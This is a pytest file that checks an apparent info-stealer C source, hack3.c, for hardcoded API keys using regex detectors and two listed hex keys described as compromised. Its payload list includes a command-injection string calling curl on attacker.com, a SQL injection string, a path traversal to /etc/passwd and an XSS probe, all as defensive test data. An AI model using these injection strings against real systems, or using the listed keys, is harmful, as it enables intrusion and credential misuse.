import pytest
import re
import os
import subprocess
import sys

# Known hardcoded credentials that should never appear in source/binaries
KNOWN_HARDCODED_KEYS = [
    "7e7778f8c29bc4b171512caa6cc81af63ed96832f53e7e35fb706dd320ab8c42",
    "379698a4f06f18cb3ad388145cf62f47a8da22852a08dd19b3ef48aaedffd3fa",
]

# Patterns that indicate hardcoded API keys/secrets in source code
HARDCODED_SECRET_PATTERNS = [
    r'#define\s+\w*(?:API_KEY|SECRET|TOKEN|PASSWORD|PASSWD|CREDENTIAL|AUTH)\s+"[A-Fa-f0-9]{32,}"',
    r'#define\s+\w*(?:FILE_ID|BOT_TOKEN|CHAT_ID)\s+"[A-Fa-f0-9]{32,}"',
    r'(?:api_key|secret|token|password)\s*=\s*"[A-Za-z0-9+/]{20,}={0,2}"',
    r'(?:API_KEY|SECRET_KEY|BOT_TOKEN)\s*=\s*"[A-Za-z0-9_\-]{20,}"',
    r'"[A-Fa-f0-9]{64}"',  # 64-char hex strings (SHA256-like secrets)
    r'"[A-Fa-f0-9]{32}"',  # 32-char hex strings (MD5-like secrets)
    r'[0-9]{8,10}:[A-Za-z0-9_\-]{35}',  # Telegram bot token pattern
]

ADVERSARIAL_PAYLOADS = [
    # Direct known hardcoded keys
    "7e7778f8c29bc4b171512caa6cc81af63ed96832f53e7e35fb706dd320ab8c42",
    "379698a4f06f18cb3ad388145cf62f47a8da22852a08dd19b3ef48aaedffd3fa",
    # Variations/obfuscations attackers might use
    "7E7778F8C29BC4B171512CAA6CC81AF63ED96832F53E7E35FB706DD320AB8C42",  # uppercase
    "7e7778f8c29bc4b171512caa6cc81af63ed96832f53e7e35fb706dd320ab8c42\n",  # with newline
    " 7e7778f8c29bc4b171512caa6cc81af63ed96832f53e7e35fb706dd320ab8c42",  # with space
    # Generic high-entropy strings that look like API keys
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "0000000000000000000000000000000000000000000000000000000000000000",
    # Telegram bot token patterns
    "1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghi",
    "9876543210:zyxwvutsrqponmlkjihgfedcbaZYXWVUTSR",
    # VirusTotal API key pattern (64 hex chars)
    "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
    "cafebabecafebabecafebabecafebabecafebabecafebabecafebabecafebabe0",
    # Injection attempts in key values
    '"; system("curl attacker.com"); //',
    "' OR '1'='1",
    "../../../etc/passwd",
    "<script>alert(1)</script>",
    # Empty/null boundary cases
    "",
    "null",
    "undefined",
    "None",
]


@pytest.mark.parametrize("payload", ADVERSARIAL_PAYLOADS)
def test_no_hardcoded_credentials_in_source(payload):
    """Invariant: Hardcoded API keys and credentials must never appear in source code files.
    Any credential found in source can be trivially extracted and used by attackers."""
    
    # Find the target source file
    target_file = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        "03-injection", "04-stealer", "hack3.c"
    )
    
    # If file doesn't exist, check current directory and parents
    search_paths = [
        target_file,
        os.path.join(os.getcwd(), "hack3.c"),
        os.path.join(os.getcwd(), "03-injection", "04-stealer", "hack3.c"),
    ]
    
    found_file = None
    for path in search_paths:
        if os.path.exists(path):
            found_file = path
            break
    
    if found_file is None:
        pytest.skip("Source file hack3.c not found - skipping source scan")
    
    with open(found_file, 'r', errors='replace') as f:
        source_content = f.read()
    
    # The payload (if it's a known hardcoded key) must not appear in source
    stripped_payload = payload.strip()
    if stripped_payload in KNOWN_HARDCODED_KEYS:
        # This is the core security invariant: known credentials must not be hardcoded
        assert stripped_payload not in source_content, (
            f"SECURITY VIOLATION: Hardcoded credential '{stripped_payload[:8]}...' "
            f"found in source file {found_file}. "
            f"Credentials must be loaded from environment variables or secure vaults, "
            f"never hardcoded in source code."
        )


@pytest.mark.parametrize("pattern", HARDCODED_SECRET_PATTERNS)
def test_no_credential_patterns_in_source(pattern):
    """Invariant: Source code must not contain patterns matching hardcoded API keys or secrets."""
    
    target_file = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        "03-injection", "04-stealer", "hack3.c"
    )
    
    search_paths = [
        target_file,
        os.path.join(os.getcwd(), "hack3.c"),
        os.path.join(os.getcwd(), "03-injection", "04-stealer", "hack3.c"),
    ]
    
    found_file = None
    for path in search_paths:
        if os.path.exists(path):
            found_file = path
            break
    
    if found_file is None:
        pytest.skip("Source file hack3.c not found - skipping pattern scan")
    
    with open(found_file, 'r', errors='replace') as f:
        source_content = f.read()
    
    matches = re.findall(pattern, source_content, re.IGNORECASE | re.MULTILINE)
    
    assert len(matches) == 0, (
        f"SECURITY VIOLATION: Pattern '{pattern}' matched potential hardcoded credentials "
        f"in {found_file}: {matches[:3]}. "
        f"Credentials must never be hardcoded in source files."
    )


@pytest.mark.parametrize("known_key", KNOWN_HARDCODED_KEYS)
def test_known_keys_not_in_repository_files(known_key):
    """Invariant: Known compromised/hardcoded credentials must not exist anywhere in the repository."""
    
    # Search common source file extensions
    extensions = ['.c', '.h', '.cpp', '.py', '.js', '.ts', '.go', '.java', '.cs', '.rb']
    
    search_root = os.getcwd()
    
    found_in_files = []
    
    for root, dirs, files in os.walk(search_root):
        # Skip hidden directories and common non-source dirs
        dirs[:] = [d for d in dirs if not d.startswith('.') and d not in 
                   ('node_modules', '__pycache__', 'venv', '.git', 'build', 'dist')]
        
        for filename in files:
            if any(filename.endswith(ext) for ext in extensions):
                filepath = os.path.join(root, filename)
                try:
                    with open(filepath, 'r', errors='replace') as f:
                        content = f.read()
                    if known_key in content:
                        found_in_files.append(filepath)
                except (IOError, OSError):
                    continue
    
    assert len(found_in_files) == 0, (
        f"SECURITY VIOLATION: Known hardcoded credential '{known_key[:8]}...' "
        f"found in repository files: {found_in_files}. "
        f"These credentials are compromised and must be rotated immediately. "
        f"Use environment variables or a secrets manager instead."
    )


def test_credentials_should_use_environment_variables():
    """Invariant: Credential loading should reference environment variables, not literal values."""
    
    target_file = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        "03-injection", "04-stealer", "hack3.c"
    )
    
    search_paths = [
        target_file,
        os.path.join(os.getcwd(), "hack3.c"),
        os.path.join(os.getcwd(), "03-injection", "04-stealer", "hack3.c"),
    ]
    
    found_file = None
    for path in search_paths:
        if os.path.exists(path):
            found_file = path
            break
    
    if found_file is None:
        pytest.skip("Source file hack3.c not found")
    
    with open(found_file, 'r', errors='replace') as f:
        source_content = f.read()
    
    # Check that known hardcoded values are not present
    for key in KNOWN_HARDCODED_KEYS:
        assert key not in source_content, (
            f"SECURITY VIOLATION: Hardcoded credential detected in {found_file}. "
            f"The credential '{key[:8]}...' is hardcoded. "
            f"Use getenv() or equivalent to load credentials from environment variables."
        )
    
    # Verify no 64-char hex strings are defined as macros (typical for API keys)
    hex64_macro_pattern = re.compile(
        r'#define\s+\w+\s+"[A-Fa-f0-9]{64}"',
        re.MULTILINE
    )
    matches = hex64_macro_pattern.findall(source_content)
    assert len(matches) == 0, (
        f"SECURITY VIOLATION: Found {len(matches)} hardcoded 64-char hex credential(s) "
        f"defined as macros in {found_file}. "
        f"These appear to be API keys and must not be hardcoded."
    )